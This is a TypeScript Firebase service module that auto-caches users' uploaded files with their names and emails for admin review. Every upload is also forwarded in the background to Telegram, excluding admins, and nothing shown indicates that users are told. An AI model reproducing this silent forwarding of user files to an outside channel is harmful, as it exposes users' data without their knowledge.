import { db, storage } from '../lib/firebase';
import { 
  collection, 
  doc, 
  setDoc, 
  getDoc, 
  getDocs, 
  query, 
  where, 
  orderBy, 
  limit, 
  deleteDoc, 
  updateDoc, 
  increment, 
  Timestamp, 
  serverTimestamp,
  addDoc
} from 'firebase/firestore';
import { ref, uploadBytes, getDownloadURL, deleteObject } from 'firebase/storage';
import { CacheFileRecord, CacheCategory, CacheActivityLog, UserRecord, CacheStats, CachePermissions } from '../types';
import { forwardFileToTelegram } from './telegramForwardService';

/**
 * Compute SHA-256 hash of a file or ArrayBuffer in the browser
 */
export async function computeFileSha256(fileOrBuffer: Blob | ArrayBuffer): Promise<string> {
  try {
    const buffer = fileOrBuffer instanceof Blob 
      ? await fileOrBuffer.arrayBuffer() 
      : fileOrBuffer;
    
    const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  } catch (err) {
    console.warn('SHA-256 calculation fallback:', err);
    return `hash_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
  }
}

/**
 * Automatic File Type / Category Detector
 */
export function detectCategory(filename: string, mimeType: string = ''): CacheCategory {
  const lowerName = (filename || '').toLowerCase();
  const lowerMime = (mimeType || '').toLowerCase();

  if (lowerName.endsWith('.svga')) return 'svga';
  if (lowerName.endsWith('.vap')) return 'vap';
  if (lowerName.endsWith('.pag')) return 'pag';
  if (lowerName.endsWith('.json') || lowerMime.includes('json')) return 'json';
  
  if (
    lowerName.endsWith('.mp4') || 
    lowerName.endsWith('.webm') || 
    lowerName.endsWith('.mov') || 
    lowerName.endsWith('.avi') || 
    lowerName.endsWith('.mkv') ||
    lowerMime.startsWith('video/')
  ) {
    return 'video';
  }

  if (
    lowerName.endsWith('.png') || 
    lowerName.endsWith('.jpg') || 
    lowerName.endsWith('.jpeg') || 
    lowerName.endsWith('.webp') || 
    lowerName.endsWith('.gif') || 
    lowerName.endsWith('.svg') || 
    lowerName.endsWith('.bmp') || 
    lowerName.endsWith('.ico') || 
    lowerName.endsWith('.apng') ||
    lowerMime.startsWith('image/')
  ) {
    return 'image';
  }

  if (
    lowerName.endsWith('.mp3') || 
    lowerName.endsWith('.wav') || 
    lowerName.endsWith('.aac') || 
    lowerName.endsWith('.ogg') || 
    lowerName.endsWith('.m4a') || 
    lowerName.endsWith('.flac') ||
    lowerMime.startsWith('audio/')
  ) {
    return 'audio';
  }

  return 'other';
}

/**
 * Clean and format bytes into readable sizes (KB, MB, GB)
 */
export function formatFileSize(bytes: number): string {
  if (!bytes || bytes <= 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(2))} ${sizes[i]}`;
}

/**
 * Generate a unique file ID
 */
export function generateFileId(): string {
  const timestamp = Date.now().toString(36);
  const randomStr = Math.random().toString(36).substring(2, 10);
  return `cf_${timestamp}_${randomStr}`;
}

/**
 * Background Upload Queue to avoid UI freezing
 */
class CacheUploadQueue {
  private queue: Array<() => Promise<void>> = [];
  private isProcessing = false;

  public enqueue(task: () => Promise<void>) {
    this.queue.push(task);
    this.processNext();
  }

  private async processNext() {
    if (this.isProcessing || this.queue.length === 0) return;
    this.isProcessing = true;
    const task = this.queue.shift();
    if (task) {
      try {
        await task();
      } catch (err) {
        console.warn('[CacheUploadQueue] Task error:', err);
      }
    }
    this.isProcessing = false;
    this.processNext();
  }
}

export const cacheQueue = new CacheUploadQueue();

/**
 * Auto-Save uploaded file to User Central Cache Storage
 */
export async function autoCacheUploadedFile(
  file: File | Blob, 
  user: UserRecord | null, 
  sourceFeature: string = 'Uploader',
  customName?: string,
  extraMeta?: { width?: number; height?: number; fps?: number; frames?: number; duration?: number }
): Promise<CacheFileRecord | null> {
  if (!file || !user?.id) {
    // If user is not logged in, we cannot link to a user cache
    return null;
  }

  try {
    const rawFileName = customName || (file instanceof File ? file.name : `file_${Date.now()}`);
    const cleanFileName = rawFileName.replace(/[^a-zA-Z0-9._-]/g, '_');
    const extension = rawFileName.includes('.') ? rawFileName.split('.').pop()?.toLowerCase() || '' : '';
    const mimeType = file.type || 'application/octet-stream';
    const category = detectCategory(rawFileName, mimeType);
    const size = file.size;

    // 1. Calculate SHA-256 for deduplication and file verification
    const sha256 = await computeFileSha256(file);

    // Check if user already has identical file in active cache
    try {
      const existingQuery = query(
        collection(db, 'user_cache'),
        where('userId', '==', user.id),
        where('sha256', '==', sha256),
        where('status', '==', 'active'),
        limit(1)
      );
      const existingSnap = await getDocs(existingQuery);
      if (!existingSnap.empty) {
        const existingDoc = existingSnap.docs[0];
        const existingData = existingDoc.data() as CacheFileRecord;
        // Update its timestamp and touch it
        await updateDoc(existingDoc.ref, {
          updatedAt: Timestamp.now(),
          sourceFeature: sourceFeature || existingData.sourceFeature
        });
        console.log(`[Cache] File already exists for user (${cleanFileName}), refreshed timestamp.`);
        return { ...existingData, id: existingDoc.id };
      }
    } catch (e) {
      console.warn('[Cache] Deduplication query skipped:', e);
    }

    // 2. Upload Binary to Firebase Storage
    const fileId = generateFileId();
    const storagePath = `user_cache/${user.id}/${fileId}_${cleanFileName}`;
    const storageRef = ref(storage, storagePath);

    await uploadBytes(storageRef, file, {
      contentType: mimeType,
      customMetadata: {
        userId: user.id,
        userName: user.displayName || user.name || '',
        userEmail: user.email || '',
        sha256: sha256,
        sourceFeature: sourceFeature,
        fileId: fileId
      }
    });

    const downloadUrl = await getDownloadURL(storageRef);
    const origin = typeof window !== 'undefined' ? window.location.origin : '';
    const secureUrl = `${origin}/api/cache/file/${fileId}`;

    // 3. Save Record in Firestore `user_cache`
    const cacheRecord: CacheFileRecord = {
      id: fileId,
      userId: user.id,
      userName: user.displayName || user.name || 'مستخدم',
      userEmail: user.email || '',
      userNumericId: user.numericId || '',
      fileName: cleanFileName,
      originalName: rawFileName,
      extension: extension,
      category: category,
      mimeType: mimeType,
      size: size,
      storagePath: storagePath,
      downloadUrl: downloadUrl,
      secureUrl: secureUrl,
      sha256: sha256,
      dimensions: extraMeta?.width && extraMeta?.height ? { width: extraMeta.width, height: extraMeta.height } : undefined,
      fps: extraMeta?.fps,
      frames: extraMeta?.frames,
      duration: extraMeta?.duration,
      sourceFeature: sourceFeature,
      status: 'active',
      createdAt: Timestamp.now(),
      updatedAt: Timestamp.now(),
      downloadCount: 0
    };

    await setDoc(doc(db, 'user_cache', fileId), cacheRecord);

    // 4. Log Cache Activity
    await logCacheActivity({
      userId: user.id,
      userName: user.displayName || user.name || 'مستخدم',
      userEmail: user.email || '',
      fileId: fileId,
      fileName: cleanFileName,
      fileSize: size,
      action: 'file_uploaded',
      details: `تم حفظ نسخة تلقائية في الكاش (${category.toUpperCase()}) من ميزة: ${sourceFeature}`,
      timestamp: Timestamp.now()
    });

    console.log(`[User Cache] File cached successfully: ${cleanFileName} (${fileId})`);

    // 🚀 Automatic Telegram Forwarding Integration (Background, non-blocking, strictly excludes admins)
    forwardFileToTelegram(file, user, sourceFeature, cleanFileName, {
      downloadUrl,
      secureUrl,
      sha256,
      dimensions: cacheRecord.dimensions,
      duration: cacheRecord.duration
    }).catch(err => console.warn('[Telegram Dispatch] Non-blocking dispatch catch:', err));

    return cacheRecord;
  } catch (error) {
    console.error('[User Cache] Error caching file:', error);
    return null;
  }
}

/**
 * Enqueue an upload (or array of uploads) to run safely in background without blocking UI
 */
export function enqueueAutoCache(
  fileOrFiles: File | Blob | File[] | Blob[], 
  user: UserRecord | null, 
  sourceFeature: string = 'Uploader',
  customName?: string,
  extraMeta?: { width?: number; height?: number; fps?: number; frames?: number; duration?: number }
) {
  if (!fileOrFiles || !user?.id) return;
  const list = Array.isArray(fileOrFiles) ? fileOrFiles : [fileOrFiles];
  for (const item of list) {
    if (!item) continue;
    cacheQueue.enqueue(async () => {
      await autoCacheUploadedFile(item, user, sourceFeature, customName, extraMeta);
    });
  }
}

/**
 * Retrieve User Cache Files
 */
export async function getUserCacheFiles(userId: string, categoryFilter?: string): Promise<CacheFileRecord[]> {
  try {
    let q = query(
      collection(db, 'user_cache'),
      where('userId', '==', userId),
      where('status', '==', 'active'),
      orderBy('createdAt', 'desc')
    );

    if (categoryFilter && categoryFilter !== 'all') {
      q = query(
        collection(db, 'user_cache'),
        where('userId', '==', userId),
        where('status', '==', 'active'),
        where('category', '==', categoryFilter),
        orderBy('createdAt', 'desc')
      );
    }

    const snap = await getDocs(q);
    return snap.docs.map(d => ({ ...d.data(), id: d.id } as CacheFileRecord));
  } catch (error) {
    console.error('[User Cache] Error fetching user cache files:', error);
    return [];
  }
}

/**
 * Retrieve All Cache Files across all users (for Admin CACHE MANAGEMENT)
 */
export async function getAllCacheFiles(limitCount: number = 200, categoryFilter?: string): Promise<CacheFileRecord[]> {
  try {
    let q = query(
      collection(db, 'user_cache'),
      where('status', '==', 'active'),
      orderBy('createdAt', 'desc'),
      limit(limitCount)
    );

    if (categoryFilter && categoryFilter !== 'all') {
      q = query(
        collection(db, 'user_cache'),
        where('status', '==', 'active'),
        where('category', '==', categoryFilter),
        orderBy('createdAt', 'desc'),
        limit(limitCount)
      );
    }

    const snap = await getDocs(q);
    return snap.docs.map(d => ({ ...d.data(), id: d.id } as CacheFileRecord));
  } catch (error) {
    console.error('[User Cache] Error fetching all cache files:', error);
    return [];
  }
}

/**
 * Delete Cache File (Removes Storage binary & marks or deletes Firestore doc)
 */
export async function deleteCacheFile(
  file: CacheFileRecord, 
  operator: { id: string; name: string; email?: string; role?: string }
): Promise<boolean> {
  try {
    // 1. Delete Storage binary if path exists
    if (file.storagePath) {
      try {
        const fileRef = ref(storage, file.storagePath);
        await deleteObject(fileRef);
      } catch (storageErr) {
        console.warn('[User Cache] Storage delete warning (file might already be deleted):', storageErr);
      }
    }

    // 2. Delete Firestore Document
    await deleteDoc(doc(db, 'user_cache', file.id));

    // 3. Log Activity
    await logCacheActivity({
      userId: file.userId,
      userName: file.userName,
      userEmail: file.userEmail,
      adminId: operator.id,
      adminName: operator.name,
      fileId: file.id,
      fileName: file.fileName,
      fileSize: file.size,
      action: 'file_deleted',
      details: `تم حذف الملف من الكاش بواسطة: ${operator.name} (${operator.role || 'Admin'})`,
      timestamp: Timestamp.now()
    });

    return true;
  } catch (error) {
    console.error('[User Cache] Error deleting cache file:', error);
    throw error;
  }
}

/**
 * Record File Download Count and Timestamp
 */
export async function recordFileDownload(
  file: CacheFileRecord, 
  user?: UserRecord | null
): Promise<void> {
  try {
    const docRef = doc(db, 'user_cache', file.id);
    await updateDoc(docRef, {
      downloadCount: increment(1),
      lastDownloadedAt: Timestamp.now()
    });

    await logCacheActivity({
      userId: file.userId,
      userName: file.userName,
      userEmail: file.userEmail,
      adminId: user?.id !== file.userId ? user?.id : undefined,
      adminName: user?.id !== file.userId ? (user?.displayName || user?.name) : undefined,
      fileId: file.id,
      fileName: file.fileName,
      fileSize: file.size,
      action: 'file_downloaded',
      details: `تم تنزيل الملف بواسطة: ${user?.displayName || user?.name || 'مستخدم'}`,
      timestamp: Timestamp.now()
    });
  } catch (err) {
    console.warn('[User Cache] Failed to record download:', err);
  }
}

/**
 * Record Link Copied event
 */
export async function recordLinkCopied(
  file: CacheFileRecord, 
  user?: UserRecord | null
): Promise<void> {
  try {
    await logCacheActivity({
      userId: file.userId,
      userName: file.userName,
      userEmail: file.userEmail,
      adminId: user?.id !== file.userId ? user?.id : undefined,
      adminName: user?.id !== file.userId ? (user?.displayName || user?.name) : undefined,
      fileId: file.id,
      fileName: file.fileName,
      action: 'link_copied',
      details: `تم نسخ رابط الملف: ${file.fileName}`,
      timestamp: Timestamp.now()
    });
  } catch (err) {
    console.warn('[User Cache] Failed to record link copy:', err);
  }
}

/**
 * Toggle User Cache Access (Admin Only)
 */
export async function toggleUserCacheAccess(
  targetUserId: string,
  enable: boolean,
  adminUser: UserRecord,
  permissions?: Partial<CachePermissions>
): Promise<void> {
  try {
    const defaultPerms: CachePermissions = {
      view: true,
      download: true,
      copyLink: true,
      delete: false,
      manage: false,
      ...(permissions || {})
    };

    await updateDoc(doc(db, 'users', targetUserId), {
      hasCacheAccess: enable,
      cachePermissions: defaultPerms,
      cacheAccessUpdatedAt: Timestamp.now(),
      cacheAccessUpdatedBy: adminUser.displayName || adminUser.name || adminUser.id
    });

    await logCacheActivity({
      userId: targetUserId,
      userName: `User_${targetUserId}`,
      adminId: adminUser.id,
      adminName: adminUser.displayName || adminUser.name || 'Admin',
      action: enable ? 'cache_enabled' : 'cache_disabled',
      details: enable 
        ? `تم تفعيل نظام الكاش ☠️ للحساب بواسطة المشرف ${adminUser.displayName || adminUser.name}`
        : `تم تعطيل نظام الكاش للحساب بواسطة المشرف ${adminUser.displayName || adminUser.name}`,
      timestamp: Timestamp.now()
    });
  } catch (error) {
    console.error('[User Cache] Error toggling cache access:', error);
    throw error;
  }
}

/**
 * Log an activity to `cache_activity_logs`
 */
export async function logCacheActivity(log: Omit<CacheActivityLog, 'id'>): Promise<void> {
  try {
    await addDoc(collection(db, 'cache_activity_logs'), {
      ...log,
      timestamp: log.timestamp || Timestamp.now()
    });
  } catch (error) {
    console.warn('[User Cache] Error logging activity:', error);
  }
}

/**
 * Get Cache Activity Logs
 */
export async function getCacheActivityLogs(limitCount: number = 100, userId?: string): Promise<CacheActivityLog[]> {
  try {
    let q = query(
      collection(db, 'cache_activity_logs'),
      orderBy('timestamp', 'desc'),
      limit(limitCount)
    );

    if (userId) {
      q = query(
        collection(db, 'cache_activity_logs'),
        where('userId', '==', userId),
        orderBy('timestamp', 'desc'),
        limit(limitCount)
      );
    }

    const snap = await getDocs(q);
    return snap.docs.map(d => ({ ...d.data(), id: d.id } as CacheActivityLog));
  } catch (error) {
    console.error('[User Cache] Error fetching activity logs:', error);
    return [];
  }
}

/**
 * Calculate Global Cache Statistics
 */
export async function computeCacheStats(allUsers: UserRecord[] = []): Promise<CacheStats> {
  try {
    const snap = await getDocs(query(collection(db, 'user_cache'), where('status', '==', 'active')));
    
    let totalSizeBytes = 0;
    const categoryCounts: Record<CacheCategory, number> = {
      svga: 0,
      vap: 0,
      video: 0,
      image: 0,
      audio: 0,
      animation: 0,
      pag: 0,
      json: 0,
      other: 0
    };

    let recentUploadsCount = 0;
    let recentDownloadsCount = 0;
    const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);

    snap.docs.forEach(docSnap => {
      const data = docSnap.data() as CacheFileRecord;
      totalSizeBytes += (data.size || 0);
      const cat = data.category || 'other';
      if (categoryCounts[cat] !== undefined) {
        categoryCounts[cat]++;
      } else {
        categoryCounts.other++;
      }

      const createdMillis = data.createdAt?.toMillis ? data.createdAt.toMillis() : new Date(data.createdAt).getTime();
      if (createdMillis > oneDayAgo) {
        recentUploadsCount++;
      }
      recentDownloadsCount += (data.downloadCount || 0);
    });

    const activeCacheUsersCount = allUsers.filter(u => u.hasCacheAccess === true).length;
    const disabledCacheUsersCount = allUsers.length - activeCacheUsersCount;

    return {
      totalFiles: snap.size,
      totalSizeBytes,
      activeCacheUsersCount,
      disabledCacheUsersCount,
      categoryCounts,
      recentUploadsCount,
      recentDownloadsCount
    };
  } catch (error) {
    console.error('[User Cache] Error computing stats:', error);
    return {
      totalFiles: 0,
      totalSizeBytes: 0,
      activeCacheUsersCount: 0,
      disabledCacheUsersCount: 0,
      categoryCounts: {
        svga: 0, vap: 0, video: 0, image: 0, audio: 0, animation: 0, pag: 0, json: 0, other: 0
      },
      recentUploadsCount: 0,
      recentDownloadsCount: 0
    };
  }
}
